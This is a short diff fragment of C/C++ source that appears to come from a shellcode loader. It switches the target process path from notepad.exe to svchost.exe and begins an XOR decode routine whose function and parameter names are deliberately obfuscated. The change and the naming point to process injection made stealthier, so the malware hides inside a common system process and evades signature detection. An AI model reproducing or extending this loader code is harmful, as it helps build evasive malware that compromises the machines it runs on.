@@ -5,7 +5,7 @@
 
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
-const char* itsthepath = "C:\\Windows\\System32\\notepad.exe";
+const char* itsthepath = "C:\\Windows\\System32\\svchost.exe";
 void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
     DWORD da=0;
     while (da < c1o2d3e4Len) {
